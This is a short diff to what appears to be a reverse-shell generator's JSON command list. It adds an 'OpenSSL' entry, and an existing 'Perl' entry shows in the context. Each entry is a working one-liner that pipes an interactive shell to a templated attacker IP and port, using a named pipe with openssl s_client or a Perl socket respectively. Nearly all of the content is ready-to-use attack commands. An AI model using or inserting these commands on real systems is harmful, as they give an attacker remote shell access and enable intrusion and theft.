@@ -110,6 +110,13 @@
         ]
     },
     {
+        "name": "OpenSSL",
+        "command": "mkfifo /tmp/sin; {shell} -i < /tmp/sin 2>&1 | openssl s_client -quiet -connect ${values.ip}:${values.port} > /tmp/sin; rm /tmp/sin",
+        "tags": [
+            "linux"
+        ]
+    },
+    {
         "name": "Perl",
         "command": "perl -e 'use Socket;$i=\"${values.ip}\";$p=${values.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
         "tags": [
